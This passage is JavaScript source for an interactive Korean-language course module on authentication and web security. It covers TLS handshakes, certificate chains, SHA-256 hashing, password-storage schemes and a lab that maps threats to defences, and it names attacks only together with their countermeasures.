/* Week 6 — Authentication & Web Security */
'use strict';
(function () {
const T = H.tbl;
const req = (line, f = []) => ({ L: 'L7', n: 'HTTP 요청', f: [['요청줄', line], ...f] });
const res = (status, f = []) => ({ L: 'L7', n: 'HTTP 응답', f: [['상태', status], ...f] });
const tls = (n, f) => ({ L: 'L4', n, f });
const lines = arr => `<ul class="ln-list">${arr.map(x => `<li>${x}</li>`).join('')}</ul>`;

/* ---------- browser crypto helpers (labs) ---------- */
const enc = new TextEncoder();
const hex = buf => [...new Uint8Array(buf)].map(b => b.toString(16).padStart(2, '0')).join('');
const sha256 = async s => hex(await crypto.subtle.digest('SHA-256', enc.encode(s)));
const b64u = bytes => btoa(String.fromCharCode(...bytes)).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
const b64uStr = s => b64u(enc.encode(s));
const unb64u = s => { try { s = s.replace(/-/g, '+').replace(/_/g, '/'); while (s.length % 4) s += '='; return decodeURIComponent(escape(atob(s))); } catch (e) { return null; } };
async function hmac(secret, data) { const k = await crypto.subtle.importKey('raw', enc.encode(secret), { name: 'HMAC', hash: 'SHA-256' }, false, ['sign']); return b64u(new Uint8Array(await crypto.subtle.sign('HMAC', k, enc.encode(data)))); }
const canCrypto = () => !!(window.crypto && crypto.subtle);

/* ---------- data ---------- */
const STORE = [
  ['local', 'localStorage', '가능', '<span class="cbad">토큰 탈취</span>', '<span class="cok">안전</span> (자동 전송 없음)', '간단하지만 XSS 한 번이면 끝'],
  ['session', 'sessionStorage', '가능', '<span class="cbad">토큰 탈취</span>', '<span class="cok">안전</span>', '탭을 닫으면 사라짐. 위험은 localStorage와 같다'],
  ['mem', '메모리 (JS 변수)', '같은 실행 중만', '△ 탈취 어려움', '<span class="cok">안전</span>', '새로고침 시 사라짐 → Refresh 쿠키와 조합'],
  ['cookie', 'HttpOnly + Secure 쿠키', '<b>불가</b>', '<span class="cok">탈취 불가</span>', '△ SameSite로 방어 필요', '세션 · Refresh Token에 권장'],
];
const PW = [
  ['plain', '✕ 평문', 'inu1234', 'DB가 유출되면 <b>즉시</b> 모든 계정 탈취', 'bad'],
  ['aes', '✕ 암호화 (AES)', 'U2FsdGVkX1+…', '키도 서버에 있다 → 키와 함께 털리면 복호화. “되돌릴 수 있다”는 것 자체가 문제', 'bad'],
  ['sha', '△ 단순 해시 (SHA-256)', '9b1f3c…e42a', '같은 비밀번호 = 같은 해시 → 레인보우 테이블로 바로 찾음 · GPU로 초당 수십억 번 대입', 'part'],
  ['salt', '△ 해시 + Salt', 'salt=Qx9 · 3e7a…', '레인보우 테이블은 막지만 SHA-256은 여전히 <b>너무 빠르다</b>', 'part'],
  ['slow', '○ 느린 해시 + Salt', '$argon2id$v=19$m=…', 'Argon2id · bcrypt · scrypt — 일부러 느리고 메모리를 써서 대량 대입을 비싸게', 'ok'],
];

addWeek({ id: 'w6', num: 6, short: '6주', title: 'Authentication & Web Security', range: 'Week 6',
  lead: '“누구인지 확인하고(<b>인증</b>), 무엇을 할 수 있는지 통제한다(<b>인가</b>)” — 5주차에 만든 API를 지키는 법. 통로(TLS) · 신원(비밀번호 · MFA) · 출입증(세션 · JWT) · 권한(OAuth · RBAC) · 공격 방어(XSS · CSRF · SQLi)를 한 요청의 길 위에 배치한다.',
  sections: [

{ id: 'w6.q', title: '이번 주의 질문 — 5주차 API를 누가, 어떤 통로로, 무엇을?', slides: 'S1–S4',
  blocks: [
    H.key('핵심 질문: 학생이 “로그인 → 내 성적 조회”를 할 때, 비밀번호 · 토큰 · 성적 데이터는 어떤 장치들로 보호되고, 각 장치가 빠지면 무엇이 깨지는가?'),
    { fig: `<div class="stack" style="max-width:640px">${[['bad', 'Week 6 — 보안 (Security) ← 이번 주', 'TLS · 인증 · 인가 · 토큰 · 공격 방어'], ['l7', 'Week 5 — API 설계 (REST)', '/students/10 · CRUD · CORS'], ['l7', 'Week 4 — HTTP · TLS · DNS', 'Method · Status · Header · Cookie'], ['l4', 'Week 3 — TCP · UDP', 'Port · Socket'], ['l3', 'Week 2 — IP · Ethernet', '주소 · 라우팅']].map(([c, a, b], i) => `<div style="background:var(--${c});${i ? 'opacity:.75' : ''}">${a} <span>${b}</span></div>`).join('')}</div>`, cap: '보안은 한 계층이 아니라 <b>모든 계층에 걸쳐 있다</b>. 4주차에 이름만 만났던 HTTPS · 쿠키 · JWT의 동작 원리를 이번 주에 연다.' },
    T(['5주차가 남긴 숙제', '필요한 것'], [['GET /v1/grades 를 <b>아무나</b> 호출하면?', '누구인지 확인 — <b>인증</b>'], ['학생이 PATCH /v1/grades/7 로 <b>자기 성적을 고치면</b>?', '권한 확인 — <b>인가</b>'], ['카페 Wi-Fi에서 토큰이 <b>그대로 보이면</b>?', '통로 암호화 — <b>TLS</b>']]),
    T(['Week 6 질문', '답 (절)'], [['① 통로 — 중간에서 엿보거나 바꾸지 못하게 하려면?', 'TLS · 인증서 (6.3 – 6.9)'], ['② 신원 — 진짜 김인천 학생인지 어떻게 확인하나?', '비밀번호 해시 · MFA (6.10 – 6.13)'], ['③ 상태 — 매 요청마다 비밀번호를 보내지 않으려면?', '세션 · JWT (6.14 – 6.20)'], ['④ 권한·공격 — 남의 데이터, 위조 요청을 어떻게 막나?', 'OAuth · RBAC · XSS/CSRF 방어 (6.21 – 6.28)']]),
    { h3: '핵심 용어 12개 — 본인 말로 한 줄씩 (S4)' },
    T(['용어', '한 줄 정의'], [['TLS', '전송 구간을 암호화하고 서버 신원을 확인하는 프로토콜. HTTPS의 S'], ['Certificate', '“이 공개키는 이 도메인의 것”이라고 CA가 서명한 전자 신분증'], ['Authentication', '인증 — “누구세요?” 사용자의 신원을 확인'], ['Authorization', '인가 — “무엇을 해도 되나요?” 권한을 확인'], ['Cookie', '서버가 Set-Cookie로 주면 브라우저가 이후 요청에 자동으로 붙이는 작은 값'], ['Session', '서버가 로그인 상태를 저장하고, 브라우저에는 Session ID만 주는 방식'], ['JWT', 'header.payload.signature 형태의 서명된 토큰. 서버가 기억 없이 검증'], ['OAuth 2.0', '비밀번호를 넘기지 않고 제3자 앱에 “제한된 권한”을 위임하는 표준'], ['API Key', '프로그램(앱·서버)을 식별하는 고정 비밀 문자열. 사용자 로그인과 다르다'], ['Access Token', 'API 호출에 쓰는 짧은 수명의 출입증 (예: 15분)'], ['Refresh Token', 'Access Token이 만료되면 새로 받기 위한 긴 수명의 토큰'], ['Hash', '입력을 고정 길이 값으로 바꾸는 단방향 함수. 되돌릴 수 없다']]),
    H.note('강의: 보안의 목표는 “보고 듣는 것을 막는 것”이 아니라 “무슨 내용인지 알 수 없게 하는 것”이다. 이 12개를 설명할 수 있으면 인증서 경고 · 401/403 · DevTools의 Cookie 탭을 읽을 수 있다.'),
  ] },

{ id: 'w6.big', title: '보안을 회사 건물로 — 통로 · 신원 · 출입증 · 권한 · 기록', slides: 'S5–S6',
  blocks: [
    T(['건물', '질문', '웹 기술', '하는 일'], [['① 경비 정문', '건물이 진짜 우리 회사인가?', '<b>TLS + 인증서</b>', '서버 신원 확인 · 암호화된 통로'], ['② 안내 데스크', '당신은 누구인가?', '<b>Authentication</b>', 'ID/비밀번호 · MFA'], ['③ 출입카드 발급', '매번 신분증 대신 카드만 찍고 다니세요', '<b>Session · JWT</b>', '로그인 상태 유지'], ['④ 층별 게이트', '이 카드로 7층 연구실에 들어갈 수 있나?', '<b>Authorization</b>', '역할 · 소유권 검사'], ['⑤ 출입 기록', '누가 언제 어디를 드나들었나?', '<b>Logging · Audit</b>', '이상 징후 탐지']]),
    T(['빠지면?', '건물에서는', '웹에서는'], [['① 없음', '가짜 건물에 들어가 정보를 넘긴다', '피싱 · <b>중간자(MITM)</b>가 비밀번호와 토큰을 가로챈다'], ['④ 없음', '1층 카드로 사장실까지 열린다', '학생 토큰으로 /admin, 남의 /grades/1002 까지 조회 (<b>IDOR</b>)']]),
    { h3: '공격은 어디에서 일어나는가 — 요청 하나의 길 위에 배치하기 (S6)' },
    { lab: { title: '구간을 고르면 공격(Threat)과 방어(Control)가 보인다', init: { z: 'net' },
      ctl: [{ k: 'z', type: 'select', label: '구간', opts: [['user', '사용자 / 브라우저'], ['net', '네트워크 (Wi-Fi · ISP)'], ['web', '웹 서버 / API'], ['auth', '인증 · 인가 로직'], ['db', 'Database']] }],
      out: st => { const Z = { user: [['XSS로 토큰 탈취', '피싱 사이트', '약한 비밀번호'], ['HttpOnly 쿠키 · CSP', 'MFA · 출력 이스케이프']], net: [['도청 (Sniffing)', '중간자 공격 (MITM)', '가짜 인증서'], ['TLS (HTTPS)', '인증서 검증 · HSTS']], web: [['CSRF 위조 요청', '무차별 대입 (Brute force)', 'Secret 노출'], ['SameSite · CSRF 토큰', 'Rate limit (429)']], auth: [['권한 검사 누락', 'IDOR (남의 id 조회)', '토큰 서명 미검증'], ['서버측 RBAC', '소유권 검사 · 403']], db: [['SQL Injection', '평문 비밀번호 유출', '과다 데이터 노출'], ['파라미터 바인딩', 'Argon2/bcrypt 해시']] }[st.z];
        const order = ['user', 'net', 'web', 'auth', 'db'], nm = { user: '브라우저', net: '네트워크', web: '웹 서버', auth: '인증·인가', db: 'DB' };
        return `<div class="segs">${order.map(k => `<span class="seg" style="${k === st.z ? 'outline:2px solid var(--bad)' : 'opacity:.55'}"><b>${nm[k]}</b><small>${k === 'net' ? 'TLS가 지키는 곳' : ''}</small></span>`).join('<span class="cm">→</span>')}</div>` +
          `<div class="pair"><div><h4 class="cbad">공격 (Threat)</h4>${lines(Z[0])}</div><div><h4 class="cok">방어 (Control)</h4>${lines(Z[1])}</div></div>` +
          `<p style="margin:0">${st.z === 'net' ? 'TLS가 지키는 것은 <b>이 구간뿐</b>이다.' : 'TLS를 켜도 이 구간은 <b>따로</b> 지켜야 한다.'}${st.z === 'db' ? ' 강의: DB까지 공격이 들어왔다는 것은 앞단이 다 털렸다는 뜻이다.' : ''}</p>`; } } },
    H.warn('보안은 “HTTPS 켰으니 끝”이 아니다. TLS는 <b>네트워크 구간</b>만 지킨다 — 브라우저 안(XSS), 서버 로직(IDOR), DB(SQLi)는 각자 따로 지켜야 한다.'),
  ] },

{ id: 'w6.cia', title: 'HTTP는 엽서, HTTPS는 봉인된 봉투 — 세 가지 보안 목표', slides: 'S7',
  blocks: [
    `<div class="pair"><div><h4 class="cbad">HTTP — 엽서</h4>${lines(['우체국 직원, 배달원 누구나 내용을 읽을 수 있다', '중간에 글씨를 고쳐 써도 받는 사람은 모른다', '보낸 사람 이름도 누구나 거짓으로 쓸 수 있다'])}${H.pre('POST /login\nid=2026001&pw=inu1234   ← 카페 Wi-Fi에서 그대로 보임')}</div><div><h4 class="cok">HTTPS — 봉인된 등기 봉투</h4>${lines(['내용은 받는 사람만 열 수 있다 (기밀성)', '봉인이 뜯기면 바로 티가 난다 (무결성)', '보낸 곳이 진짜 은행인지 확인된다 (인증)'])}${H.pre('17 03 03 00 4a 9f e2 1c 7b …\n← 같은 Wi-Fi에서도 의미 없는 바이트만 보임')}</div></div>`,
    T(['보안 목표', '막아 주는 공격', '비유', 'TLS에서 담당하는 기술'], [['<b>기밀성</b> (Confidentiality)', '도청 · 패킷 스니핑', '봉투에 넣어 아무도 못 읽게', '대칭키 암호 (AES-GCM 등)'], ['<b>무결성</b> (Integrity)', '중간에서 내용 변조', '봉인 스티커 — 뜯으면 티 남', 'MAC / AEAD 인증 태그'], ['<b>인증</b> (Authentication)', '가짜 서버 · 중간자(MITM)', '보낸 곳의 신분증 확인', '인증서 + 전자서명']]),
    H.key('TLS의 3대 목표 = <b>기밀성 · 무결성 · 인증</b> (C · I · A가 아니라 C · I · <b>Authentication</b>). 시험에 그대로 나온다.'),
  ] },

{ id: 'w6.crypto', title: '대칭키와 공개키 — TLS의 하이브리드 전략', slides: 'S8–S9',
  blocks: [
    `<div class="pair"><div><h4>대칭키 (Symmetric) — 같은 열쇠 하나</h4>${lines(['잠글 때와 열 때 같은 키 (AES, ChaCha20)', '장점: <b>매우 빠르다</b> → 실제 데이터 암호화에 사용', '문제: 처음 만난 상대에게 이 키를 어떻게 안전하게 전달하지? 보내는 순간 도청당하면 끝'])}</div><div><h4>공개키 (Asymmetric) — 열쇠 한 쌍</h4>${lines(['공개키는 모두에게, 개인키는 나만 (RSA, ECDSA, X25519)', '공개키로 잠근 것은 개인키로만 열린다', '개인키로 서명한 것은 공개키로 누구나 검증', '단점: 대칭키보다 <b>수백~수천 배 느리다</b> → 키 교환·서명에만'])}</div></div>`,
    { fig: `<div class="hflow">${[['1', '공개키 기술로 키 교환 (ECDHE)'], ['2', '양쪽이 같은 세션 키 계산'], ['3', '세션 키로 대칭 암호화 (AES)'], ['4', '연결 종료 시 세션 키 폐기']].map(([n, t]) => `<div class="fl-step"><b>${n}</b><span>${t}</span></div>`).join('<span class="fl-arr">→</span>')}</div>`, cap: 'TLS는 둘의 장점만 골라 쓴다 — 공개키로 “열쇠를 안전하게 나누고”, 대칭키로 “빠르게 암호화”.' },
    H.key('세션 키는 연결마다 새로 만든다 = <b>Forward Secrecy</b>. 나중에 서버 개인키가 유출돼도 과거에 녹화된 대화는 풀 수 없다.'),
    { h3: '공개키를 “열린 자물쇠”로 이해하기 (S9)' },
    T(['비유', '실제 기술', '포인트'], [['열린 자물쇠 (수천 개를 누구에게나)', '<b>공개키</b>', '공개되어도 안전 — 잠그기(암호화) · 서명 검증만 가능'], ['자물쇠의 열쇠 (금고에)', '<b>개인키</b>', '유출되면 끝 — 서버의 key.pem, 절대 Git에 올리지 않음'], ['상자 속 비밀 쪽지', '<b>세션 키</b>', '이후 대화는 이 대칭키로 빠르게 암호화 · 잠근 나도 다시 못 연다'], ['자물쇠가 진짜 은행 것인가?', '<b>인증서</b>', '가짜 자물쇠를 나눠 주는 사기꾼을 막는 장치']]),
    H.warn('남은 문제: 도둑이 자기 자물쇠를 “은행 자물쇠”라고 속여 나눠 주면? → “이 자물쇠는 진짜 은행 것”이라는 <b>보증서(인증서)</b>가 필요하다 (6.6).'),
  ] },

{ id: 'w6.hash', title: '해시와 전자서명 — 지문과 도장', slides: 'S10',
  blocks: [
    `<p>해시는 데이터의 <b>지문</b>, 서명은 <b>개인키로 찍은 도장</b>이다. 인증서 · JWT · 비밀번호 저장의 공통 재료.</p>`,
    { lab: { title: 'SHA-256 직접 돌려 보기 — 한 글자만 바꿔 보자', init: { a: 'inu1234', b: 'inu1235' },
      ctl: [{ k: 'a', type: 'text', label: '입력 A', w: 200 }, { k: 'b', type: 'text', label: '입력 B', w: 200 }],
      out: st => `<div class="mono" style="font-size:13.5px;word-break:break-all"><div>A = ${esc(st.a)}</div><div data-h="a" style="color:var(--l3)">계산 중…</div><div style="margin-top:6px">B = ${esc(st.b)}</div><div data-h="b" style="color:var(--l7)">계산 중…</div></div><p data-diff style="margin:8px 0 0"></p>`,
      after: async (st, out) => { if (!canCrypto()) { out.querySelectorAll('[data-h]').forEach(e => e.textContent = '(이 환경에서는 crypto.subtle을 쓸 수 없다)'); return; }
        const [ha, hb] = await Promise.all([sha256(st.a), sha256(st.b)]); const a = out.querySelector('[data-h="a"]'), b = out.querySelector('[data-h="b"]'); if (!a) return;
        a.textContent = ha; b.innerHTML = [...hb].map((c, i) => c === ha[i] ? c : `<b style="background:var(--bad-s)">${c}</b>`).join('');
        const same = [...ha].filter((c, i) => c === hb[i]).length; out.querySelector('[data-diff]').innerHTML = st.a === st.b ? '같은 입력 → <b>항상 같은 출력</b>.' : `64자리 중 ${64 - same}자리가 다르다 — <b>눈사태 효과</b>. 입력이 1글자든 1GB든 결과는 항상 256비트(64자리 16진수).`; } } },
    T(['해시의 성질', '의미'], [['<b>단방향</b>', '해시값으로 원문을 되돌릴 수 없다'], ['<b>고정 길이</b>', '1글자든 1GB든 결과는 256비트'], ['<b>눈사태 효과</b>', '1비트만 바뀌어도 결과가 크게 바뀜'], ['<b>충돌 저항</b>', '같은 해시를 갖는 두 입력을 찾기 어렵다']]),
    { fig: `<div class="pair"><div><h4>보내는 쪽 (서버 · CA · 토큰 발급자)</h4><div class="hflow">${['문서', '해시', '<b>개인키로 서명</b>'].map(t => `<div class="fl-step"><span>${t}</span></div>`).join('<span class="fl-arr">→</span>')}</div></div><div><h4>받는 쪽</h4><div class="hflow">${['받은 문서 → 해시 ①', '서명 → <b>공개키로 검증</b> ②', '① = ② ?'].map(t => `<div class="fl-step"><span>${t}</span></div>`).join('<span class="fl-arr">→</span>')}</div></div></div>`, cap: '①과 ②가 같으면 “위조 없음 + 진짜 발급자” 확인.' },
    T(['도구', '무엇을 보장?', '어디에 쓰나'], [['해시', '무결성 (바뀌었나?)', '비밀번호 저장, 파일 검증'], ['HMAC', '무결성 + 비밀 공유자', 'JWT HS256, 웹훅 서명'], ['전자서명', '무결성 + <b>발급자 증명</b>', '인증서, JWT RS256/ES256']]),
    H.key('서명은 데이터를 <b>숨기지 않는다</b>. 누구나 읽을 수 있지만, 바꾸면 들킨다. (→ JWT가 암호화가 아닌 이유, 6.18)'),
    H.warn('전자서명은 “내용을 숨기는 기술”이 아니다 — 숨기는 것은 암호화. 시험 단골 함정.'),
  ] },

{ id: 'w6.cert', title: '인증서 = 디지털 여권', slides: 'S11',
  blocks: [
    { fig: `<div class="card" style="max-width:520px;border:2px solid var(--line);border-radius:12px;padding:14px 18px"><div class="cm" style="font-size:12px;letter-spacing:.08em">CERTIFICATE · 디지털 여권</div>${[['이름 (Subject / SAN)', 'www.inu.ac.kr'], ['발급 기관 (Issuer)', 'Sectigo RSA DV CA'], ['유효 기간', '2026-03-01 ~ 2027-03-31'], ['소지자의 공개키', 'RSA 2048 · 30 82 01 0a …'], ['발급 기관의 도장', 'Signature (CA 개인키로 서명)']].map(([a, b]) => `<div style="display:flex;justify-content:space-between;gap:10px;border-bottom:1px dashed var(--line);padding:5px 0"><span class="cm">${a}</span><b class="mono">${b}</b></div>`).join('')}</div>` },
    T(['여권', '인증서', '브라우저가 확인하는 것'], [['이름', 'Subject · SAN', '접속한 주소와 일치하는가?'], ['발급 국가 · 외교부', 'Issuer (CA)', '믿을 수 있는 CA인가?'], ['유효 기간', 'Not Before / After', '만료되지 않았는가?'], ['사진', '공개키', '이 키로 서버가 서명했나?'], ['위조 방지 홀로그램', 'CA의 전자서명', '서명이 CA 공개키로 검증되나?'], ['분실 신고', '폐기 (OCSP · CRL)', '취소된 인증서는 아닌가?']]),
    H.key('신뢰의 위임 — 입국 심사관(브라우저)은 여권 소지자(서버)를 직접 알지 못한다. 외교부(CA)를 믿기 때문에 여권을 믿는다.'),
    H.warn('인증서는 “이 서버가 그 도메인의 주인”임을 보증할 뿐, <b>“착한 사이트”임을 보증하지 않는다</b>. 피싱 사이트도 자기 도메인 인증서는 쉽게 받는다.'),
  ] },

{ id: 'w6.chain', title: '인증서 체인 — 신뢰는 어디서 시작되는가', slides: 'S12',
  blocks: [
    { fig: `<div class="stack" style="max-width:560px">${[['ok', 'Root CA', 'ISRG Root X1 · DigiCert Global Root — OS·브라우저에 미리 내장(Trust Store) · 자기 자신이 서명(Self-signed)'], ['l4', '↓ 서명함 — Intermediate CA', "Let's Encrypt R11 · Sectigo DV CA — 평소 발급 업무 · Root 개인키는 오프라인 금고에"], ['l7', '↓ 서명함 — Leaf (서버 인증서)', 'CN / SAN = www.inu.ac.kr · 서버가 TLS Handshake에서 전송']].map(([c, a, b]) => `<div style="background:var(--${c})">${a} <span>${b}</span></div>`).join('')}</div>` },
    { lab: { title: '브라우저의 검증 순서 — 어디서 실패하나', init: { san: true, date: true, inter: true, root: true, rev: false },
      ctl: [{ k: 'san', type: 'toggle', label: 'SAN = 주소창 도메인' }, { k: 'date', type: 'toggle', label: '유효 기간 안 (PC 시계 정상)' }, { k: 'inter', type: 'toggle', label: '서버가 Intermediate까지 보냄 (fullchain)' }, { k: 'root', type: 'toggle', label: 'Root가 내 Trust Store에 있음' }, { k: 'rev', type: 'toggle', label: '폐기(revoked)된 인증서' }],
      out: st => { const steps = [['Leaf의 이름(SAN)이 주소창 도메인과 같은가?', st.san, 'NET::ERR_CERT_COMMON_NAME_INVALID', 'SAN에 모든 도메인(www 포함) 넣어 재발급'], ['유효 기간 안인가?', st.date, 'NET::ERR_CERT_DATE_INVALID', '자동 갱신(certbot) 확인 · 시계 동기화'], ['Leaf 서명을 Intermediate 공개키로 검증', st.inter, 'NET::ERR_CERT_AUTHORITY_INVALID', '서버에 fullchain.pem 설정 (체인 누락)'], ['Intermediate 서명을 Root 공개키로 검증', st.inter, 'NET::ERR_CERT_AUTHORITY_INVALID', '—'], ['Root가 내 Trust Store에 있는가?', st.root, 'NET::ERR_CERT_AUTHORITY_INVALID', '자체 서명(self-signed) 인증서 — 공인 CA로 발급'], ['폐기된 인증서가 아닌가?', !st.rev, 'NET::ERR_CERT_REVOKED', 'OCSP · CRL에 올라간 인증서 — 재발급']];
        const fail = steps.findIndex(s => !s[1]);
        return `<ol class="ln-list" style="list-style:decimal;padding-left:22px">${steps.map((s, i) => `<li style="${fail >= 0 && i > fail ? 'opacity:.4' : ''}">${s[0]} ${fail === i ? '<b class="cbad">✕</b>' : fail >= 0 && i > fail ? '' : '<b class="cok">✓</b>'}</li>`).join('')}</ol>` +
          (fail < 0 ? `<div class="verdict ok">자물쇠 아이콘 🔒 — 이 서버는 www.inu.ac.kr의 주인이다</div>` : `<div class="verdict bad">${steps[fail][2]}</div><p style="margin:0">조치: ${steps[fail][3]}</p>`); } } },
    H.pre(`$ openssl s_client -connect www.inu.ac.kr:443 -servername www.inu.ac.kr -showcerts </dev/null | grep -E "s:|i:"
# s: = subject(누구의 인증서) · i: = issuer(누가 서명) — 체인이 위로 이어지는지 확인`),
    H.key('브라우저가 <b>처음부터 믿는 것은 Root CA</b>(OS·브라우저의 Trust Store)뿐이다. 나머지는 서명을 따라 내려오며 신뢰를 “물려받는다”.'),
  ] },

{ id: 'w6.tls', title: 'TLS 1.3 Handshake — 1-RTT 만에 키 합의 + 서버 인증', slides: 'S13–S14',
  blocks: [
    { trace: { mode: 'ladder', title: 'TCP 3-way handshake 이후의 TLS 1.3', sub: '①② 키 합의 → Cert · ③ 서버 인증 → ④⑤ 암호화된 HTTP', side: 120, rowH: 58,
      lanes: [{ id: 'c', label: 'Client', sub: 'Browser' }, { id: 's', label: 'Server', sub: 'www.inu.ac.kr:443' }],
      events: [
        { from: 'c', to: 's', label: '① ClientHello', color: 'l4', pkt: [tls('ClientHello', [['지원 암호 목록', 'TLS_AES_128_GCM_SHA256, …'], ['key_share', '내 임시 공개값 (X25519)'], ['SNI', 'www.inu.ac.kr (평문)']])], say: '지원하는 암호 목록과 <b>key_share</b>(내 임시 공개값), 그리고 <b>SNI</b>를 보낸다. SNI = 한 IP에 여러 도메인이 있을 때 “www.inu.ac.kr 인증서 주세요”.' },
        { from: 's', to: 'c', label: '② ServerHello', color: 'l4', pkt: [tls('ServerHello', [['선택한 암호', 'TLS_AES_128_GCM_SHA256'], ['key_share', '서버 임시 공개값']])], say: '서버가 암호를 고르고 자기 key_share를 보낸다. 이제 양쪽은 상대의 공개값 + 자기 비밀값으로 <b>같은 세션 키</b>를 각자 계산한다 (ECDHE). — <b>여기부터 암호화</b>' },
        { from: 's', to: 'c', label: 'Certificate (체인)', color: 'l7', pkt: [tls('Certificate (암호화)', [['Leaf', 'CN/SAN = www.inu.ac.kr'], ['Intermediate', 'Sectigo DV CA']])], say: '서버 인증서 체인. 브라우저는 6.7의 순서로 체인을 검증한다 → 진짜 서버인지 확인.' },
        { from: 's', to: 'c', label: '③ CertificateVerify · Finished', color: 'l7', pkt: [tls('CertificateVerify', [['서명', '지금까지의 대화를 서버 개인키로 서명'], ['Finished', '핸드셰이크가 변조되지 않았음 확인']])], say: '“여권 사진 속 인물이 나”라는 증거 — <b>개인키를 가진 진짜 주인</b>임을 증명한다. 인증서만으로는 부족하다(인증서는 공개 문서라 누구나 복사해 보낼 수 있다).' },
        { from: 'c', to: 's', label: '④ Finished + GET /login', color: 'ok', pkt: [tls('Application Data', [['내용', 'AES-GCM으로 암호화된 HTTP 요청'], ['밖에서 보이는 것', '17 03 03 00 4a 9f e2 …']])], say: '클라이언트 Finished와 함께 <b>바로 HTTP 요청</b>을 보낸다 — 1-RTT.' },
        { from: 's', to: 'c', label: '⑤ HTTP 응답 (암호화)', color: 'ok', pkt: [tls('Application Data', [['내용', '세션 키로 암호화된 HTTP 응답']])], say: '이후 모든 HTTP 메시지는 세션 키(AES-GCM)로 암호화된다. 연결이 끝나면 세션 키는 폐기.' },
      ] } },
    T(['단계', '무슨 일이 일어나나'], [['①②', '양쪽의 key_share로 같은 세션 키를 각자 계산 (ECDHE)'], ['Cert', '브라우저가 체인 검증 → 진짜 서버인지 확인'], ['③', '개인키를 가진 진짜 주인임을 증명'], ['④⑤', '세션 키(AES-GCM)로 HTTP 메시지를 암호화']]),
    H.note('TLS 1.2는 2-RTT, TLS 1.3은 1-RTT. 3주차의 TCP 1-RTT + TLS 1-RTT가 지나야 첫 HTTP 요청이 나간다 — HTTPS 첫 연결이 느린 이유.'),
    { h3: '“비밀 대화방 만들기” — 물감 섞기(Diffie–Hellman) 비유 (S14)' },
    T(['단계', '비유', '실제'], [['1', '“나는 이 암호들을 쓸 줄 알아. 내 물감은 노랑+비밀색”', 'ClientHello · key_share'], ['2', '“AES로 하자. 내 물감은 노랑+다른 비밀색. 이게 내 여권이야”', 'ServerHello · Certificate'], ['3', '“여권 속 인물이 나라는 증거로 방금 대화에 도장을 찍을게”', 'CertificateVerify'], ['4', '각자 상대 물감에 자기 비밀색을 섞으면 둘 다 똑같은 갈색 = 세션 키', 'Finished · 암호화 통신']]),
    H.key('섞기는 쉽지만 섞인 색에서 비밀색을 분리하기는 매우 어렵다 → 광장의 구경꾼은 최종 색을 만들 수 없다.<br>하지만 <b>여권이 없다면</b> 중간에 끼어든 사기꾼과도 “대화방”은 만들어진다. 암호화만으로는 부족하다 — <b>누구와</b> 암호화했는지가 중요하다. 그래서 인증서 경고를 무시하고 [계속 진행]을 누르면 안 된다.'),
  ] },

{ id: 'w6.tlsdo', title: 'TLS가 지켜 주는 것, 지켜 주지 않는 것', slides: 'S15',
  blocks: [
    `<div class="pair"><div><h4 class="cok">지켜 준다 ✓</h4>${lines(['카페 Wi-Fi · ISP에서의 도청', '전송 중 데이터 변조', '가짜 서버로의 연결 (인증서 검증 시)', 'URL 경로 · 쿼리 · 헤더 · Body 모두 암호화'])}</div><div><h4 class="cbad">지켜 주지 않는다 ✕</h4>${lines(['서버에 도착한 뒤의 데이터 (DB 유출)', '브라우저 안의 악성 스크립트 (XSS)', '피싱 사이트 — 자기 도메인 인증서는 정상', '도메인 이름(SNI · DNS)은 일부 노출'])}</div></div>`,
    H.key('<b>HSTS</b> — <code>Strict-Transport-Security: max-age=31536000</code><br>“앞으로 1년간 이 사이트는 HTTPS로만 접속하라”. http:// 로 시작하는 첫 요청을 가로채 평문에 붙잡아 두는 <b>SSL Strip</b> 공격을 막는다.'),
    T(['브라우저 경고 (Chrome)', '원인', '조치'], [['NET::ERR_CERT_DATE_INVALID', '인증서 만료 또는 PC 시계 오류', '자동 갱신(certbot) 확인, 시계 동기화'], ['NET::ERR_CERT_COMMON_NAME_INVALID', '주소와 인증서 SAN 불일치 (www 누락 등)', 'SAN에 모든 도메인 포함해 재발급'], ['NET::ERR_CERT_AUTHORITY_INVALID', '자체 서명(self-signed), 체인 누락', '서버에 fullchain.pem 설정'], ['Mixed Content 차단', 'HTTPS 페이지에서 http:// 리소스 호출', '모든 리소스 · API를 HTTPS로']], { mono: [0] }),
    H.warn('인증서 경고는 “보안 기능이 정상 동작한 결과”다. 개발 중 경고를 끄는 코드(<code>verify=False</code>)를 AI가 넣었다면, 배포 전에 반드시 제거한다.'),
    H.note('HTTPS를 켜도 XSS · SQL Injection은 막히지 않는다 — 둘은 브라우저 안과 서버·DB의 문제다.'),
  ] },

{ id: 'w6.authn', title: 'Authentication vs Authorization — 401과 403', slides: 'S16–S17',
  blocks: [
    T(['', 'Authentication (인증 · AuthN)', 'Authorization (인가 · AuthZ)'], [['질문', '당신은 누구인가? (Who are you?)', '당신은 이것을 해도 되는가? (What can you do?)'], ['확인하는 것', '비밀번호 · OTP · 지문 · 인증서', '역할(role) · 소유권 · 정책 · scope'], ['순서', '<b>먼저</b> — 신원이 확인되어야', '<b>그다음</b> — 권한을 판단할 수 있다'], ['결과물', 'Session · Access Token (신원 증명)', '허용 / 거부 결정'], ['실패 시 HTTP', '<b>401 Unauthorized</b> — “로그인하세요”', '<b>403 Forbidden</b> — “당신은 안 됩니다”'], ['다시 로그인하면?', '해결될 수 있다 (토큰 만료 등)', '해결되지 않는다 (권한 자체가 없음)'], ['예', '학번 2026001 + 비밀번호 확인', '학생은 성적 조회만, 교수는 성적 입력도']]),
    { lab: { title: '요청 하나가 통과하는 길 — Client → 인증 → 인가 → Handler', init: { tok: 'ok', role: 'student', sid: '2026001', m: 'GET' },
      ctl: [{ k: 'tok', type: 'select', label: 'Authorization 헤더', opts: [['none', '없음'], ['exp', 'Bearer (만료된 토큰)'], ['bad', 'Bearer (서명이 틀린 토큰)'], ['ok', 'Bearer (유효한 토큰)']] }, { k: 'role', type: 'select', label: '토큰의 role', opts: [['student', 'student (sub=2026001)'], ['professor', 'professor']] }, { k: 'm', type: 'select', label: 'Method', opts: [['GET', 'GET'], ['PATCH', 'PATCH']] }, { k: 'sid', type: 'select', label: '/v1/students/{id}/grades', opts: [['2026001', '2026001 (내 것)'], ['2026002', '2026002 (남의 것)']] }],
      out: st => { const path = `${st.m} /v1/students/${st.sid}/grades`; let stop = -1, code = '200 OK', why = '';
